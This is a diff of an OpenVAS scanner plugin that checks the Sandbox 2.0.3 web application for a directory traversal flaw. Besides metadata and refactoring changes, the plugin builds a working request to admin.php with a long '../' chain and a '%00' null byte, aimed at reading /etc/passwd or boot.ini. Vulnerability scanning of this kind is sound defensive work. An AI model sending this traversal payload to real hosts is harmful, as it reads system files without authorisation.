@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_sandbox_41420.nasl 5373 2017-02-20 16:27:48Z teissa $
+# $Id: gb_sandbox_41420.nasl 5763 2017-03-29 11:54:30Z cfi $
 #
 # Sandbox Multiple Remote Vulnerabilities
 #
@@ -37,11 +37,11 @@ Sandbox 2.0.3 is vulnerable; prior versions may also be affected.";
 
 tag_solution = "Updates are available; please see the references for more information.";
 
-if (description)
+if(description)
 {
  script_id(100707);
- script_version("$Revision: 5373 $");
- script_tag(name:"last_modification", value:"$Date: 2017-02-20 17:27:48 +0100 (Mon, 20 Feb 2017) $");
+ script_version("$Revision: 5763 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-29 13:54:30 +0200 (Wed, 29 Mar 2017) $");
  script_tag(name:"creation_date", value:"2010-07-08 14:00:46 +0200 (Thu, 08 Jul 2010)");
  script_bugtraq_id(41420);
  script_tag(name:"cvss_base", value:"7.5");
@@ -56,7 +56,7 @@ if (description)
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
- script_dependencies("find_service.nasl", "http_version.nasl");
+ script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name : "solution" , value : tag_solution);
@@ -66,34 +66,33 @@ if (description)
 
 include("http_func.inc");
 include("http_keepalive.inc");
-include("global_settings.inc");
+include("host_details.inc");
    
 port = get_http_port(default:80);
-
-if(!get_port_state(port))exit(0);
 if(!can_host_php(port:port))exit(0);
 
-dirs = make_list("/sandbox",cgi_dirs());
-files = make_array("root:.*:0:[01]:","etc/passwd","\[boot loader\]","boot.ini");
+files = traversal_files();
 
-foreach dir (dirs) {
-   
-  url = string(dir, "/index.php"); 
+foreach dir( make_list_unique( "/sandbox", cgi_dirs( port:port ) ) ) {
 
-  if(http_vuln_check(port:port, url:url,pattern:"Powered by Sandbox")) {
-  
+  if( dir == "/" ) dir = "";
+  url = dir + "/index.php";
+  buf = http_get_cache( item:url, port:port );
+  if( buf == NULL )continue;
+
+  if( "Powered by Sandbox" >< buf ) {
+
     foreach file (keys(files)) {
 
       url = string(dir, "/admin.php?a=../../../../../../../../../../../../../../",files[file],"%00");
 
       if(http_vuln_check(port:port, url:url,pattern:file)) {
-
-        security_message(port:port);
-        exit(0);
-      }  
+        report = report_vuln_url( port:port, url:url );
+        security_message( port:port, data:report );
+        exit( 0 );
+      }
     }
   }
 }
 
-exit(0);
-
+exit( 99 );
